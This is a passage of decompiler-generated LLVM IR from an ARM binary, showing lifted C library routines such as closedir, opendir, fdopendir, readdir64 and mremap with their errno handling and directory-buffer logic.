dec_label_pc_2bba0:                               ; preds = %dec_label_pc_2bb78, %dec_label_pc_2bb88.dec_label_pc_2bba0_crit_edge, %dec_label_pc_2bb9c
  %v0_2bba0 = phi i32 [ %v0_2bba0.pre, %dec_label_pc_2bb88.dec_label_pc_2bba0_crit_edge ], [ -1, %dec_label_pc_2bb9c ], [ %v4_2bb78, %dec_label_pc_2bb78 ]
  %v2_2bba4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_2bba4, i32* @r4, align 4
  ret i32 %v0_2bba0

; uselistorder directives
  uselistorder i32 %v4_2bb78, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_2bba0, { 2, 1, 0 }
}

define i32 @getgid(i32 %arg1) local_unnamed_addr {
entry:
  %v1_2bbc4 = load i32, i32* @r0, align 4
  ret i32 %v1_2bbc4
}

define i32 @mremap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_2bbfc, label %dec_label_pc_2bbec

dec_label_pc_2bbec:                               ; preds = %entry
  %v0_2bbec = call i32 @__GI___errno_location()
  %v0_2bbf0 = load i32, i32* %r4.global-to-local, align 4
  %v1_2bbf0 = sub i32 0, %v0_2bbf0
  %v2_2bbf4 = inttoptr i32 %v0_2bbec to i32*
  store i32 %v1_2bbf0, i32* %v2_2bbf4, align 4
  br label %dec_label_pc_2bbfc

dec_label_pc_2bbfc:                               ; preds = %entry, %dec_label_pc_2bbec
  %v1_2bc04 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_2bbec ]
  ret i32 %v1_2bc04

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_2bbfc, { 1, 0 }
}

define i32 @__GI_closedir(i32* %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_2bc08 = load i32, i32* @r4, align 4
  store i32 %v3_2bc08, i32* %stack_var_-24, align 4
  %v2_2bc0c = load i32, i32* %arg1, align 4
  store i32 %v2_2bc0c, i32* %r4.global-to-local, align 4
  %v3_2bc14 = icmp eq i32 %v2_2bc0c, -1
  store i32 %tmp, i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r6, align 4
  br i1 %v3_2bc14, label %dec_label_pc_2bc28, label %dec_label_pc_2bc3c

dec_label_pc_2bc28:                               ; preds = %entry
  %v0_2bc28 = call i32 @__GI___errno_location()
  store i32 9, i32* %r3.global-to-local, align 4
  %v0_2bc30 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_2bc30, i32* %r2.global-to-local, align 4
  %v2_2bc34 = inttoptr i32 %v0_2bc28 to i32*
  store i32 9, i32* %v2_2bc34, align 4
  %v0_2bcdc.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_2bcdc

dec_label_pc_2bc3c:                               ; preds = %entry
  store i32 96, i32* %r3.global-to-local, align 4
  %v1_2bc40 = add i32 %tmp, 24
  store i32 %v1_2bc40, i32* %r4.global-to-local, align 4
  store i32 %v1_2bc40, i32* %r2.global-to-local, align 4
  store i32 164, i32* %r3.global-to-local, align 4
  %v4_2bc54 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 164) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_2bc54)
  store i32 -1, i32* @r8, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  %v0_2bc6c = load i32, i32* @r6, align 4
  %v2_2bc6c = add i32 %v0_2bc6c, 36
  %v3_2bc6c = inttoptr i32 %v2_2bc6c to i32*
  %v4_2bc6c = load i32, i32* %v3_2bc6c, align 4
  call void @__pseudo_branch(i32 %v4_2bc6c)
  %v0_2bc78 = load i32, i32* @r7, align 4
  %v1_2bc78 = inttoptr i32 %v0_2bc78 to i32*
  %v2_2bc78 = load i32, i32* %v1_2bc78, align 4
  store i32 %v2_2bc78, i32* @r4, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v0_2bc88 = load i32, i32* @r8, align 4
  store i32 %v0_2bc88, i32* %v1_2bc78, align 4
  %v0_2bc8c = load i32, i32* @r6, align 4
  %v1_2bc8c = load i32, i32* %r3.global-to-local, align 4
  %v2_2bc8c = add i32 %v1_2bc8c, %v0_2bc8c
  %v3_2bc8c = inttoptr i32 %v2_2bc8c to i32*
  %v4_2bc8c = load i32, i32* %v3_2bc8c, align 4
  store i32 ptrtoint (i32* @global_var_2bc98.1933 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_2bc8c)
  %v0_2bc98 = load i32, i32* @r7, align 4
  %v1_2bc98 = add i32 %v0_2bc98, 12
  %v2_2bc98 = inttoptr i32 %v1_2bc98 to i32*
  %v3_2bc98 = load i32, i32* %v2_2bc98, align 4
  store i32 %v3_2bc98, i32* @r0, align 4
  %v0_2bc9c = call i32 @free()
  %v0_2bca0 = load i32, i32* @r7, align 4
  store i32 %v0_2bca0, i32* @r0, align 4
  %v0_2bca4 = call i32 @free()
  %v0_2bcac = load i32, i32* @r4, align 4
  %tmp11 = icmp ult i32 %v0_2bcac, -4095
  br i1 %tmp11, label %dec_label_pc_2bcd8, label %dec_label_pc_2bcc8

dec_label_pc_2bcc8:                               ; preds = %dec_label_pc_2bc3c
  %v0_2bcc8 = call i32 @__GI___errno_location()
  %v0_2bccc = load i32, i32* @r4, align 4
  %v1_2bccc = sub i32 0, %v0_2bccc
  store i32 %v1_2bccc, i32* %r3.global-to-local, align 4
  %v2_2bcd0 = inttoptr i32 %v0_2bcc8 to i32*
  store i32 %v1_2bccc, i32* %v2_2bcd0, align 4
  %v0_2bcd4 = load i32, i32* @r8, align 4
  br label %dec_label_pc_2bcd8

dec_label_pc_2bcd8:                               ; preds = %dec_label_pc_2bc3c, %dec_label_pc_2bcc8
  %v0_2bcd8 = phi i32 [ %v0_2bcac, %dec_label_pc_2bc3c ], [ %v0_2bcd4, %dec_label_pc_2bcc8 ]
  store i32 %v0_2bcd8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_2bcdc

dec_label_pc_2bcdc:                               ; preds = %dec_label_pc_2bc28, %dec_label_pc_2bcd8
  %v0_2bcdc = phi i32 [ %v0_2bcdc.pre, %dec_label_pc_2bc28 ], [ %v0_2bcd8, %dec_label_pc_2bcd8 ]
  %v2_2bce4 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_2bce4, i32* %r4.global-to-local, align 4
  ret i32 %v0_2bcdc

; uselistorder directives
  uselistorder i32 %v0_2bcac, { 1, 0 }
  uselistorder label %dec_label_pc_2bcdc, { 1, 0 }
  uselistorder label %dec_label_pc_2bcd8, { 1, 0 }
}

define i32 @function_2bcf0(i32 %arg1) local_unnamed_addr {
dec_label_pc_2bcf0:
  %v0_2bcf0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_2bcf0, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_2bcf0
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_2bcf0, %bb
  %v4_2bcfc = phi i32 [ %arg1, %dec_label_pc_2bcf0 ], [ 0, %bb ]
  ret i32 %v4_2bcfc

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @fd_to_DIR(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v12_2bd00 = load i32, i32* @r7, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r4, align 4
  %v1_2bd14 = call i32 @malloc(i32 48)
  %v2_2bd1c = icmp eq i32 %v1_2bd14, 0
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r6, align 4
  br i1 %v2_2bd1c, label %bb, label %dec_label_pc_2bd2c

bb:                                               ; preds = %entry
  br label %dec_label_pc_2bdb8

dec_label_pc_2bd2c:                               ; preds = %entry
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_2bd30 = load i32, i32* @r4, align 4
  %v2_2bd30 = icmp ugt i32 %v0_2bd30, 511
  %v2_2bd34 = add i32 %v1_2bd14, 4
  %v3_2bd34 = inttoptr i32 %v2_2bd34 to i32*
  store i32 0, i32* %v3_2bd34, align 4
  %v0_2bd38 = load i32, i32* %r3.global-to-local, align 4
  %v2_2bd38 = add i32 %v1_2bd14, 16
  %v3_2bd38 = inttoptr i32 %v2_2bd38 to i32*
  store i32 %v0_2bd38, i32* %v3_2bd38, align 4
  %v0_2bd3c = load i32, i32* %r3.global-to-local, align 4
  %v2_2bd3c = add i32 %v1_2bd14, 8
  %v3_2bd3c = inttoptr i32 %v2_2bd3c to i32*
  store i32 %v0_2bd3c, i32* %v3_2bd3c, align 4
  br i1 %v2_2bd30, label %.thread, label %bb16

.thread:                                          ; preds = %dec_label_pc_2bd2c
  %v0_2bd442 = load i32, i32* @r4, align 4
  %v2_2bd443 = add i32 %v1_2bd14, 20
  %v3_2bd444 = inttoptr i32 %v2_2bd443 to i32*
  store i32 %v0_2bd442, i32* %v3_2bd444, align 4
  br label %bb17

bb16:                                             ; preds = %dec_label_pc_2bd2c
  %v1_2bd40 = load i32, i32* %r3.global-to-local, align 4
  %v2_2bd40 = add i32 %v1_2bd40, 512
  store i32 %v2_2bd40, i32* %r3.global-to-local, align 4
  %v0_2bd44 = load i32, i32* @r4, align 4
  %v2_2bd44 = add i32 %v1_2bd14, 20
  %v3_2bd44 = inttoptr i32 %v2_2bd44 to i32*
  store i32 %v0_2bd44, i32* %v3_2bd44, align 4
  %v1_2bd48 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_2bd48, i32* %v3_2bd44, align 4
  br label %bb17

bb17:                                             ; preds = %.thread, %bb16
  store i32 %v1_2bd14, i32* @r5, align 4
  %v0_2bd50 = load i32, i32* @r7, align 4
  %v2_2bd50 = inttoptr i32 %v1_2bd14 to i32*
  store i32 %v0_2bd50, i32* %v2_2bd50, align 4
  %v0_2bd54 = load i32, i32* @r5, align 4
  %v1_2bd54 = add i32 %v0_2bd54, 20
  %v2_2bd54 = inttoptr i32 %v1_2bd54 to i32*
  %v3_2bd54 = load i32, i32* %v2_2bd54, align 4
  store i32 %v3_2bd54, i32* %r1.global-to-local, align 4
  %v2_2bd5c = call i32 @calloc(i32 1, i32 %v3_2bd54)
  %v2_2bd60 = icmp eq i32 %v2_2bd5c, 0
  store i32 %v2_2bd5c, i32* @r4, align 4
  %v1_2bd68 = load i32, i32* @r5, align 4
  %v2_2bd68 = add i32 %v1_2bd68, 12
  %v3_2bd68 = inttoptr i32 %v2_2bd68 to i32*
  store i32 %v2_2bd5c, i32* %v3_2bd68, align 4
  br i1 %v2_2bd60, label %dec_label_pc_2bd70, label %dec_label_pc_2bd80

dec_label_pc_2bd70:                               ; preds = %bb17
  %v0_2bd70 = load i32, i32* @r5, align 4
  store i32 %v0_2bd70, i32* @r0, align 4
  %v0_2bd74 = call i32 @free()
  %v0_2bd78 = load i32, i32* @r4, align 4
  br label %dec_label_pc_2bdb8

dec_label_pc_2bd80:                               ; preds = %bb17
  %v0_2bd84 = load i32, i32* @r6, align 4
  %v2_2bd84 = add i32 %v0_2bd84, -34568
  store i32 %v2_2bd84, i32* %r3.global-to-local, align 4
  %v1_2bd8c = inttoptr i32 %v2_2bd84 to i32*
  %v2_2bd8c = load i32, i32* %v1_2bd8c, align 4
  %v3_2bd8c = add i32 %v0_2bd84, -34564
  %v4_2bd8c = inttoptr i32 %v3_2bd8c to i32*
  %v5_2bd8c = load i32, i32* %v4_2bd8c, align 4
  store i32 %v5_2bd8c, i32* %r1.global-to-local, align 4
  %v6_2bd8c = add i32 %v0_2bd84, -34560
  %v7_2bd8c = inttoptr i32 %v6_2bd8c to i32*
  %v8_2bd8c = load i32, i32* %v7_2bd8c, align 4
  store i32 %v8_2bd8c, i32* %r2.global-to-local, align 4
  %v9_2bd8c = add i32 %v0_2bd84, -34556
  %v10_2bd8c = inttoptr i32 %v9_2bd8c to i32*
  %v11_2bd8c = load i32, i32* %v10_2bd8c, align 4
  store i32 %v11_2bd8c, i32* %r3.global-to-local, align 4
  %v12_2bd8c = add i32 %v0_2bd84, -34552
  %v1_2bd98 = inttoptr i32 %v12_2bd8c to i32*
  %v2_2bd98 = load i32, i32* %v1_2bd98, align 4
  %v3_2bd98 = add i32 %v0_2bd84, -34548
  %v4_2bd98 = inttoptr i32 %v3_2bd98 to i32*
  %v5_2bd98 = load i32, i32* %v4_2bd98, align 4
  store i32 %v2_2bd98, i32* %stack_var_-32, align 4
  store i32 %v5_2bd8c, i32* %r1.global-to-local, align 4
  store i32 %v8_2bd8c, i32* %r2.global-to-local, align 4
  store i32 %v11_2bd8c, i32* %r3.global-to-local, align 4
  %v0_2bda8 = load i32, i32* @r5, align 4
  %v1_2bda8 = add i32 %v0_2bda8, 24
  %v1_2bdac = inttoptr i32 %v1_2bda8 to i32*
  store i32 %v2_2bd8c, i32* %v1_2bdac, align 4
  %v3_2bdac = add i32 %v0_2bda8, 28
  %v4_2bdac = inttoptr i32 %v3_2bdac to i32*
  %v5_2bdac = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_2bdac, i32* %v4_2bdac, align 4
  %v6_2bdac = add i32 %v0_2bda8, 32
  %v7_2bdac = inttoptr i32 %v6_2bdac to i32*
  %v8_2bdac = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_2bdac, i32* %v7_2bdac, align 4
  %v9_2bdac = add i32 %v0_2bda8, 36
  %v10_2bdac = inttoptr i32 %v9_2bdac to i32*
  %v11_2bdac = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_2bdac, i32* %v10_2bdac, align 4
  %v12_2bdac = add i32 %v0_2bda8, 40
  %v2_2bdb0 = load i32, i32* %stack_var_-32, align 4
  store i32 %v5_2bd98, i32* %r1.global-to-local, align 4
  %v1_2bdb4 = inttoptr i32 %v12_2bdac to i32*
  store i32 %v2_2bdb0, i32* %v1_2bdb4, align 4
  %v3_2bdb4 = add i32 %v0_2bda8, 44
  %v4_2bdb4 = inttoptr i32 %v3_2bdb4 to i32*
  %v5_2bdb4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_2bdb4, i32* %v4_2bdb4, align 4
  %v0_2bdb8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_2bdb8

dec_label_pc_2bdb8:                               ; preds = %bb, %dec_label_pc_2bd70, %dec_label_pc_2bd80
  %v0_2bdb8 = phi i32 [ 0, %bb ], [ %v0_2bd78, %dec_label_pc_2bd70 ], [ %v0_2bdb8.pre, %dec_label_pc_2bd80 ]
  store i32 %v12_2bd00, i32* @r7, align 4
  ret i32 %v0_2bdb8

; uselistorder directives
  uselistorder i32 %v2_2bd5c, { 1, 0, 2 }
  uselistorder i32 %v1_2bd14, { 2, 1, 5, 0, 6, 4, 3, 7 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_2bdb8, { 2, 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__GI_opendir(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-104 = alloca i32, align 4
  %v2_2bdd8 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %arg1, i32* @r7, align 4
  %tmp7 = icmp ult i32 %arg1, -4095
  br i1 %tmp7, label %dec_label_pc_2be00, label %dec_label_pc_2bdf0

dec_label_pc_2bdf0:                               ; preds = %entry
  %v0_2bdf0 = call i32 @__GI___errno_location()
  %v0_2bdf4 = load i32, i32* @r7, align 4
  %v1_2bdf4 = sub i32 0, %v0_2bdf4
  %v2_2bdf8 = inttoptr i32 %v0_2bdf0 to i32*
  store i32 %v1_2bdf4, i32* %v2_2bdf8, align 4
  br label %dec_label_pc_2be24

dec_label_pc_2be00:                               ; preds = %entry
  %v1_2be00 = icmp slt i32 %arg1, 0
  br i1 %v1_2be00, label %dec_label_pc_2be24, label %dec_label_pc_2be08

dec_label_pc_2be08:                               ; preds = %dec_label_pc_2be00
  store i32 %v2_2bdd8, i32* @r1, align 4
  %v0_2be0c = call i32 @fstat()
  %v1_2be10 = icmp slt i32 %v0_2be0c, 0
  br i1 %v1_2be10, label %dec_label_pc_2be18, label %dec_label_pc_2be2c

dec_label_pc_2be18:                               ; preds = %dec_label_pc_2be08
  br label %dec_label_pc_2be24

dec_label_pc_2be24:                               ; preds = %dec_label_pc_2be18, %dec_label_pc_2be00, %dec_label_pc_2bdf0
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_2be68

dec_label_pc_2be2c:                               ; preds = %dec_label_pc_2be08
  %v0_2be34 = load i32, i32* @r7, align 4
  %v3_2be38 = call i32 @__GI___fcntl_nocancel(i32 %v0_2be34, i32 2, i32 1)
  %v0_2be3c = load i32, i32* @r7, align 4
  %v2_2be44 = call i32 @fd_to_DIR(i32 %v0_2be3c, i32 %tmp)
  store i32 %v2_2be44, i32* %r4.global-to-local, align 4
  %v2_2be48 = icmp eq i32 %v2_2be44, 0
  br i1 %v2_2be48, label %dec_label_pc_2be50, label %dec_label_pc_2be68

dec_label_pc_2be50:                               ; preds = %dec_label_pc_2be2c
  %v0_2be5c = call i32 @__GI___errno_location()
  %v2_2be64 = inttoptr i32 %v0_2be5c to i32*
  store i32 12, i32* %v2_2be64, align 4
  %v0_2be68.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_2be68

dec_label_pc_2be68:                               ; preds = %dec_label_pc_2be2c, %dec_label_pc_2be24, %dec_label_pc_2be50
  %v0_2be68 = phi i32 [ %v2_2be44, %dec_label_pc_2be2c ], [ 0, %dec_label_pc_2be24 ], [ %v0_2be68.pre, %dec_label_pc_2be50 ]
  ret i32 %v0_2be68

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_2be68, { 2, 0, 1 }
}

define i32 @fdopendir(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-104 = alloca i32, align 4
  %v2_2be80 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_2be80, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_2be8c = call i32 @fstat()
  store i32 %v0_2be8c, i32* @r5, align 4
  %v2_2be90 = icmp eq i32 %v0_2be8c, 0
  br i1 %v2_2be90, label %dec_label_pc_2be98, label %dec_label_pc_2bf00

dec_label_pc_2be98:                               ; preds = %entry
  %v1_2be9c = and i32 %tmp4, 61440
  store i32 %v1_2be9c, i32* @r3, align 4
  %v7_2bea0 = icmp eq i32 %v1_2be9c, 16384
  br i1 %v7_2bea0, label %dec_label_pc_2beb8, label %dec_label_pc_2bea8

dec_label_pc_2bea8:                               ; preds = %dec_label_pc_2be98
  %v0_2bea8 = call i32 @__GI___errno_location()
  br label %dec_label_pc_2bee4

dec_label_pc_2beb8:                               ; preds = %dec_label_pc_2be98
  %v0_2beb8 = load i32, i32* @r4, align 4
  %v2_2bec0 = call i32 @__libc_fcntl(i32 %v0_2beb8, i32 3)
  %v7_2bec4 = icmp eq i32 %v2_2bec0, -1
  br i1 %v7_2bec4, label %dec_label_pc_2bf00, label %dec_label_pc_2becc

dec_label_pc_2becc:                               ; preds = %dec_label_pc_2beb8
  %v1_2becc = urem i32 %v2_2bec0, 4
  %v7_2bed0 = icmp eq i32 %v1_2becc, 1
  br i1 %v7_2bed0, label %dec_label_pc_2bed8, label %dec_label_pc_2beec

dec_label_pc_2bed8:                               ; preds = %dec_label_pc_2becc
  %v0_2bed8 = call i32 @__GI___errno_location()
  br label %dec_label_pc_2bee4

dec_label_pc_2bee4:                               ; preds = %dec_label_pc_2bea8, %dec_label_pc_2bed8
  %storemerge2 = phi i32 [ %v0_2bea8, %dec_label_pc_2bea8 ], [ %v0_2bed8, %dec_label_pc_2bed8 ]
  %storemerge = phi i32 [ 20, %dec_label_pc_2bea8 ], [ 22, %dec_label_pc_2bed8 ]
  %storemerge1 = load i32, i32* @r5, align 4
  store i32 %storemerge1, i32* %r2.global-to-local, align 4
  %v2_2bee4 = inttoptr i32 %storemerge2 to i32*
  store i32 %storemerge, i32* %v2_2bee4, align 4
  %v0_2bf04.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_2bf04

dec_label_pc_2beec:                               ; preds = %dec_label_pc_2becc
  %v0_2beec = load i32, i32* @r4, align 4
  %v2_2bef4 = call i32 @fd_to_DIR(i32 %v0_2beec, i32 %tmp)
  store i32 %v2_2bef4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_2bf04

dec_label_pc_2bf00:                               ; preds = %entry, %dec_label_pc_2beb8
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_2bf04

dec_label_pc_2bf04:                               ; preds = %dec_label_pc_2beec, %dec_label_pc_2bee4, %dec_label_pc_2bf00
  %v0_2bf04 = phi i32 [ %v2_2bef4, %dec_label_pc_2beec ], [ %v0_2bf04.pre, %dec_label_pc_2bee4 ], [ 0, %dec_label_pc_2bf00 ]
  ret i32 %v0_2bf04

; uselistorder directives
  uselistorder i32 %v2_2bec0, { 1, 0 }
  uselistorder i32 (i32, i32)* @fd_to_DIR, { 1, 0 }
  uselistorder i32 16384, { 35, 0, 36, 5, 21, 6, 22, 7, 23, 3, 24, 4, 25, 1, 26, 2, 27, 12, 28, 13, 29, 14, 30, 10, 31, 11, 32, 8, 33, 9, 34, 15, 16, 17, 18, 19, 20 }
  uselistorder i32 ()* @fstat, { 1, 0 }
  uselistorder label %dec_label_pc_2bf04, { 2, 0, 1 }
  uselistorder label %dec_label_pc_2bf00, { 1, 0 }
  uselistorder label %dec_label_pc_2bee4, { 1, 0 }
}

define i32 @readdir64(i32* %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r6, align 4
  %v1_2bf28 = add i32 %tmp, 24
  store i32 %v1_2bf28, i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  %v4_2bf40 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 164) to i32*), align 4
  store i32 %v4_2bf40, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_2bf40)
  %v0_2bf54 = load i32, i32* @r6, align 4
  %v2_2bf54 = add i32 %v0_2bf54, 36
  %v3_2bf54 = inttoptr i32 %v2_2bf54 to i32*
  %v4_2bf54 = load i32, i32* %v3_2bf54, align 4
  store i32 %v4_2bf54, i32* %ip.global-to-local, align 4
  store i32 180064, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_2bf54)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_2bf64

dec_label_pc_2bf64:                               ; preds = %dec_label_pc_2bf94, %entry
  %v0_2bf64 = load i32, i32* @r5, align 4
  %v1_2bf64 = add i32 %v0_2bf64, 4
  %v2_2bf64 = inttoptr i32 %v1_2bf64 to i32*
  %v3_2bf64 = load i32, i32* %v2_2bf64, align 4
  %v4_2bf64 = add i32 %v0_2bf64, 8
  %v5_2bf64 = inttoptr i32 %v4_2bf64 to i32*
  %v6_2bf64 = load i32, i32* %v5_2bf64, align 4
  %tmp10 = icmp ugt i32 %v6_2bf64, %v3_2bf64
  br i1 %tmp10, label %dec_label_pc_2bf94, label %dec_label_pc_2bf70

dec_label_pc_2bf70:                               ; preds = %dec_label_pc_2bf64
  %v1_2bf70 = inttoptr i32 %v0_2bf64 to i32*
  %v2_2bf70 = load i32, i32* %v1_2bf70, align 4
  %v1_2bf74 = add i32 %v0_2bf64, 12
  %v2_2bf74 = inttoptr i32 %v1_2bf74 to i32*
  %v3_2bf74 = load i32, i32* %v2_2bf74, align 4
  %v1_2bf78 = add i32 %v0_2bf64, 20
  %v2_2bf78 = inttoptr i32 %v1_2bf78 to i32*
  %v3_2bf78 = load i32, i32* %v2_2bf78, align 4
  %v4_2bf7c = inttoptr i32 %v3_2bf74 to i32*
  %v5_2bf7c = call i32 @__getdents64(i32 %v2_2bf70, i32* %v4_2bf7c, i32 %v3_2bf78, i32 %v6_2bf64)
  %tmp9 = icmp slt i32 %v5_2bf7c, 1
  br i1 %tmp9, label %.thread, label %dec_label_pc_2bf8c

.thread:                                          ; preds = %dec_label_pc_2bf70
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_2bfc4

dec_label_pc_2bf8c:                               ; preds = %dec_label_pc_2bf70
  %v1_2bf8c = load i32, i32* @r5, align 4
  %v2_2bf8c = add i32 %v1_2bf8c, 8
  %v3_2bf8c = inttoptr i32 %v2_2bf8c to i32*
  store i32 %v5_2bf7c, i32* %v3_2bf8c, align 4
  %v0_2bf90 = load i32, i32* @r7, align 4
  %v1_2bf90 = load i32, i32* @r5, align 4
  %v2_2bf90 = add i32 %v1_2bf90, 4
  %v3_2bf90 = inttoptr i32 %v2_2bf90 to i32*
  store i32 %v0_2bf90, i32* %v3_2bf90, align 4
  %v0_2bf94.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_2bf94

dec_label_pc_2bf94:                               ; preds = %dec_label_pc_2bf64, %dec_label_pc_2bf8c
  %v1_2bfb8 = phi i32 [ %v0_2bf64, %dec_label_pc_2bf64 ], [ %v0_2bf94.pre, %dec_label_pc_2bf8c ]
  %v1_2bf94 = add i32 %v1_2bfb8, 4
  %v2_2bf94 = inttoptr i32 %v1_2bf94 to i32*
  %v3_2bf94 = load i32, i32* %v2_2bf94, align 4
  %v1_2bf98 = add i32 %v1_2bfb8, 12
  %v2_2bf98 = inttoptr i32 %v1_2bf98 to i32*
  %v3_2bf98 = load i32, i32* %v2_2bf98, align 4
  %v2_2bf9c = add i32 %v3_2bf98, %v3_2bf94
  store i32 %v2_2bf9c, i32* @r4, align 4
  %v3_2bfa0 = inttoptr i32 %v2_2bf9c to i32*
  %v4_2bfa0 = load i32, i32* %v3_2bfa0, align 4
  %v1_2bfa4 = add i32 %v2_2bf9c, 4
  %v2_2bfa4 = inttoptr i32 %v1_2bfa4 to i32*
  %v3_2bfa4 = load i32, i32* %v2_2bfa4, align 4
  %v1_2bfa8 = add i32 %v2_2bf9c, 16
  %v2_2bfa8 = inttoptr i32 %v1_2bfa8 to i16*
  %v3_2bfa8 = load i16, i16* %v2_2bfa8, align 2
  %v4_2bfa8 = zext i16 %v3_2bfa8 to i32
  %v1_2bfac = add i32 %v2_2bf9c, 8
  %v2_2bfac = inttoptr i32 %v1_2bfac to i32*
  %v3_2bfac = load i32, i32* %v2_2bfac, align 4
  store i32 %v3_2bfac, i32* %ip.global-to-local, align 4
  %v2_2bfb0 = add i32 %v4_2bfa8, %v3_2bf94
  %v2_2bfb4 = or i32 %v3_2bfa4, %v4_2bfa0
  %v4_2bfb4 = icmp eq i32 %v2_2bfb4, 0
  store i32 %v2_2bfb0, i32* %v2_2bf94, align 4
  %v0_2bfbc = load i32, i32* %ip.global-to-local, align 4
  %v1_2bfbc = load i32, i32* @r5, align 4
  %v2_2bfbc = add i32 %v1_2bfbc, 16
  %v3_2bfbc = inttoptr i32 %v2_2bfbc to i32*
  store i32 %v0_2bfbc, i32* %v3_2bfbc, align 4
  br i1 %v4_2bfb4, label %dec_label_pc_2bf64, label %dec_label_pc_2bfc4

dec_label_pc_2bfc4:                               ; preds = %dec_label_pc_2bf94, %.thread
  %v0_2bfd0 = load i32, i32* @r6, align 4
  %v2_2bfd0 = add i32 %v0_2bfd0, 76
  %v3_2bfd0 = inttoptr i32 %v2_2bfd0 to i32*
  %v4_2bfd0 = load i32, i32* %v3_2bfd0, align 4
  store i32 %v4_2bfd0, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_2bfd0)
  %v0_2bfdc = load i32, i32* @r4, align 4
  ret i32 %v0_2bfdc

; uselistorder directives
  uselistorder i32 %v2_2bf9c, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_2bfb8, { 1, 0 }
  uselistorder i32 %v6_2bf64, { 1, 0 }
  uselistorder i32 %v0_2bf64, { 0, 1, 3, 2, 4, 5 }
  uselistorder label %dec_label_pc_2bf94, { 1, 0 }
}

define i32 @function_2bff0(i32 %arg1) local_unnamed_addr {
dec_label_pc_2bff0:
  %v0_2bff0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_2bff0, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_2bff0
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_2bff0, %bb
  %v4_2bffc = phi i32 [ %arg1, %dec_label_pc_2bff0 ], [ 0, %bb ]
  ret i32 %v4_2bffc

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__GI___h_errno_location() local_unnamed_addr {
entry:
  ret i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 46952)
}

define i32 @__GI_config_read(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
